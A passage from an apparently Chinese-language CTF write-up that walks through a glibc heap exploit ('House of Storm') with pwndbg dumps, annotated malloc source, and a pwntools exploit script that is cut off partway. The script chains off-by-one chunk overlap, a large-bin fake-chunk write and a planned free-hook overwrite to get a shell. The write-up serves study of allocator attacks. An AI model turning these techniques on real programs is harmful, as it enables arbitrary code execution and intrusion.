class="line">0x555555757570:0x49495f4d524f54530x0000000000000051--&gt;4</span><br><span class="line">0x555555757580:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757590:0x00000000000000000x0000000000000000--&gt;8</span><br><span class="line">0x5555557575a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575c0:0x00000000000000000x00000000000004e1</span><br><span class="line">0x5555557575d0:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x5555557575e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757600:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757610:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><h3 id="利用unsorted-bin中的chunk插入到large-bin写数据，绕过对unsortbin中chunk的size大小的检查"><a href="#利用unsorted-bin中的chunk插入到large-bin写数据，绕过对unsortbin中chunk的size大小的检查" class="headerlink" title="利用unsorted bin中的chunk插入到large bin写数据，绕过对unsortbin中chunk的size大小的检查"></a>利用unsorted bin中的chunk插入到large bin写数据，绕过对unsortbin中chunk的size大小的检查</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">storage = <span class="number">0x13370000</span> + <span class="number">0x800</span></span><br><span class="line">fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">update(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)   <span class="comment">#bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks</span></span><br><span class="line">update(<span class="number">8</span>, p2)</span><br></pre></td></tr></table></figure><p>free 2前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555557575c0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557575c0</span><br></pre></td></tr></table></figure></p><p>free 2后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757060 —▸ 0x5555557575c0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757060 /* &apos;`puUUU&apos; */</span><br></pre></td></tr></table></figure></p><p>将2再分配出来，这时0x5555557575c0掉链，进入large bins中，再free 2，0x555555757060再次进入unsortedbin。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757060 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757060 /* &apos;`puUUU&apos; */</span><br><span class="line">pwndbg&gt; largebins </span><br><span class="line">largebins</span><br><span class="line">0x400: 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x7ffff7dd1f68</span><br><span class="line">0x440: 0x7ffff7dd1f78 (main_arena+1112) ◂— 0x7ffff7dd1f78</span><br><span class="line">0x480: 0x7ffff7dd1f88 (main_arena+1128) ◂— 0x7ffff7dd1f88</span><br><span class="line">0x4c0: 0x5555557575c0 —▸ 0x7ffff7dd1f98 (main_arena+1144) ◂— 0x5555557575c0</span><br></pre></td></tr></table></figure></p><p>然后要fake 0x555555757060的后向指针。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">storage = 0x13370000 + 0x800</span><br><span class="line">fake_chunk = storage - 0x20</span><br><span class="line"></span><br><span class="line">p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size</span><br><span class="line">p1 += p64(0) + p64(fake_chunk)      #bk</span><br><span class="line">update(7, p1)</span><br></pre></td></tr></table></figure></p><p>fake前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x555555757020</span><br><span class="line">0x555555757020:0x49495f4d524f54530x0000000000000041</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x00000000000004f1</span><br><span class="line">0x555555757070:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>fake后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x555555757020</span><br><span class="line">0x555555757020:0x49495f4d524f54530x0000000000000041</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x00000000000004f1</span><br><span class="line">0x555555757070:0x00000000000000000x00000000133707e0</span><br><span class="line">0x555555757080:0x524f5453504145480x0000000049495f4d</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>可以看出bk指针被改写。<br>然后fake<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p2 = p64(0)*4 + p64(0) + p64(0x4e1) # size</span><br><span class="line">p2 += p64(0) + p64(fake_chunk+8)    # bk, for creating the &quot;bk&quot; of the faked chunk to avoid crashing when unlinking from unsorted bin</span><br><span class="line">p2 += p64(0) + p64(fake_chunk-0x18-5)   # bk_nextsize, for creating the &quot;size&quot; of the faked chunk, using misalignment tricks</span><br><span class="line">update(8, p2)</span><br></pre></td></tr></table></figure></p><p>fake前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wndbg&gt; x/20gx 0x555555757590</span><br><span class="line">0x555555757590:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575c0:0x00000000000000000x00000000000004e1</span><br><span class="line">0x5555557575d0:0x00007ffff7dd1f980x00007ffff7dd1f98</span><br><span class="line">0x5555557575e0:0x00005555557575c00x00005555557575c0</span><br><span class="line">0x5555557575f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757600:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757610:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>fake后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x555555757590</span><br><span class="line">0x555555757590:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575c0:0x00000000000000000x00000000000004e1</span><br><span class="line">0x5555557575d0:0x00000000000000000x00000000133707e8</span><br><span class="line">0x5555557575e0:0x00000000000000000x00000000133707c3</span><br><span class="line">0x5555557575f0:0x524f5453504145480x0000000049495f4d</span><br><span class="line">0x555555757600:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757610:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757620:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    # if the heap address starts with &quot;0x56&quot;, you win</span><br><span class="line">    alloc(0x48)     #2</span><br><span class="line">except EOFError:</span><br><span class="line">    # otherwise crash and try again</span><br><span class="line">    r.close()</span><br><span class="line">    continue</span><br></pre></td></tr></table></figure><p>当再分配一个chunk的时候，会先检查unsorted bin中有没有合适的，如果没有就把unsortbin中的chunk插入large bin中。<br>看源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = largebin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">             ....</span><br><span class="line">             ....</span><br><span class="line">             ....</span><br><span class="line">             <span class="comment">// 如果size&lt;large bin中最后一个chunk即最小的chunk，就直接插到最后</span></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">                     &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;</span><br><span class="line">                     bck = bck-&gt;bk;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">               <span class="comment">// 否则正向遍历，fwd起初是large bin第一个chunk，也就是最大的chunk。</span></span><br><span class="line">             <span class="comment">// 直到满足size&gt;=large bin chunk size</span></span><br><span class="line">                     <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                       &#123;</span><br><span class="line">                         fwd = fwd-&gt;fd_nextsize;<span class="comment">//fd_nextsize指向比当前chunk小的下一个chunk</span></span><br><span class="line">                         assert (chunk_main_arena (fwd));</span><br><span class="line">                       &#125;</span><br><span class="line">                     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">                         == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                       <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                       fwd = fwd-&gt;fd;</span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                 <span class="comment">// 插入</span></span><br><span class="line">                       &#123;</span><br><span class="line">                         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                       &#125;</span><br><span class="line">                     bck = fwd-&gt;bk;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">           &#125;</span><br><span class="line">         mark_bin (av, victim_index);</span><br><span class="line">         victim-&gt;bk = bck;</span><br><span class="line">         victim-&gt;fd = fwd;</span><br><span class="line">         fwd-&gt;bk = victim;</span><br><span class="line">         bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></p><p>当找到插入的位置后，看源码里具体的插入操作。<br>注意large bin要维持两个双向链表，多了一个chunk size链表，所以要在两个链表中插入。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></p><p>在此题中，fwd只可能是我们放入large bin的唯一一个chunk，而它的bk_nextsize和bk都是我们可以控制的（如上一步的改写）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"></span><br><span class="line">----&gt;fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim</span><br></pre></td></tr></table></figure></p><p>victim就是我们要插入的堆地址。<br>bk_nextsize被写为0x13370800-0x20-0x18-5，那么*(0x13370800-0x20-0x18-5+0x20)=victim<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwd-&gt;bk=victim;</span><br></pre></td></tr></table></figure></p><p>bk被写为0x13370800-0x20+8，那么*(0x13370800 -0x20+8 ) = victim。</p><p>当第一个chunk从unsorted bin插入到large bin之后，再到unsorted bin的下一个chunk，如果不满足分配则插入到large bin中。<br>而下一个chunk是我们伪造的（0x13370800-0x20）</p><p>而这个地方已经有值了，也就是我们写入的<br><em>(0x13370800-0x20-0x18-5+0x20)=</em>0x133707e3=victim<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x133707e3</span><br><span class="line">0x133707e3:0x000056213c4c8060</span><br></pre></td></tr></table></figure></p><p>chunk的size，即0x13370800-0x20+0x8=0x133707e8,就是\x55或者\x56。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># if the heap address starts with &quot;0x56&quot;, you win</span><br><span class="line">    alloc(0x48)     #2</span><br></pre></td></tr></table></figure></p><p>之所以要求是\x56，因为需要满足一个检查。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">         av == arena_for_chunk (mem2chunk (mem)));</span><br></pre></td></tr></table></figure></p><p>即chunk的mmap标志位置位。</p><p>之前我调试的时候都是打开的ASLR，现在关掉看一下，多运行几次总能有一次成功的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-10-073111.png" alt=""><br>去掉标志位，那么它的大小就是0x50，就满足alloc(0x48)，就会返回给我们，成功返回0x13370800-0x10之后，就是传统的做法了。</p><h3 id="leak-heap-leak-libc-覆盖free-book值为system"><a href="#leak-heap-leak-libc-覆盖free-book值为system" class="headerlink" title="leak heap,leak libc,覆盖free_book值为system"></a>leak heap,leak libc,覆盖free_book值为system</h3><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;Seize it, control it, and exploit it. Welcome to the House of Storm.&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, process, ELF</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p32,p64,u32,u64</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'info'</span>)</span><br><span class="line">r = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span><span class="params">()</span>:</span></span><br><span class="line">    chal = r.recvuntil(<span class="string">'\n'</span>).strip()</span><br><span class="line">    <span class="keyword">print</span> chal</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(range(<span class="number">0</span>, <span class="number">0xff</span>), repeat=<span class="number">4</span>):</span><br><span class="line">        x = <span class="string">''</span>.join(map(chr, x)) </span><br><span class="line">        <span class="keyword">if</span> sha256(chal+x).digest().startswith(<span class="string">'\0\0\0'</span>):</span><br><span class="line">            r.send(x)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Not Found'</span></span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    <span class="keyword">assert</span>(<span class="number">12</span> &lt; size &lt;= <span class="number">0x1000</span>)</span><br><span class="line">    r.sendline(<span class="string">'%d'</span> % size)</span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'%d'</span> % idx)</span><br><span class="line">    r.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'%d'</span> % len(content))</span><br><span class="line">    r.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'%d'</span> % idx)</span><br><span class="line">    r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'%d'</span> % idx)</span><br><span class="line">    m = r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    pos1 = m.find(<span class="string">']: '</span>) + len(<span class="string">']: '</span>)</span><br><span class="line">    pos2 = m.find(<span class="string">'\n1. '</span>)</span><br><span class="line">    <span class="keyword">return</span> m[pos1:pos2]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(host)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    port = <span class="number">5655</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        r = remote(host, port)</span><br><span class="line">        proof()</span><br><span class="line"></span><br><span class="line">        r.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line"></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#0</span></span><br><span class="line">        alloc(<span class="number">0x508</span>)    <span class="comment">#1</span></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#2</span></span><br><span class="line">        update(<span class="number">1</span>, <span class="string">'h'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line"></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#3</span></span><br><span class="line">        alloc(<span class="number">0x508</span>)    <span class="comment">#4</span></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#5</span></span><br><span class="line">        update(<span class="number">4</span>, <span class="string">'h'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        update(<span class="number">0</span>, <span class="string">'h'</span>*(<span class="number">0x18</span><span class="number">-12</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#1</span></span><br><span class="line">        alloc(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">2</span>)         <span class="comment">#backward consolidate</span></span><br><span class="line">        alloc(<span class="number">0x38</span>)     <span class="comment">#1</span></span><br><span class="line">        alloc(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        update(<span class="number">3</span>, <span class="string">'h'</span>*(<span class="number">0x18</span><span class="number">-12</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">        alloc(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">        alloc(<span class="number">0x4d8</span>)    <span class="comment">#8</span></span><br><span class="line">        free(<span class="number">4</span>)</span><br><span class="line">        free(<span class="number">5</span>)         <span class="comment">#backward consolidate</span></span><br><span class="line">        alloc(<span class="number">0x48</span>)     <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        alloc(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        storage = <span class="number">0x13370000</span> + <span class="number">0x800</span></span><br><span class="line">        fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">        p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">        p1 += p64(<span class="number">0</span>) + 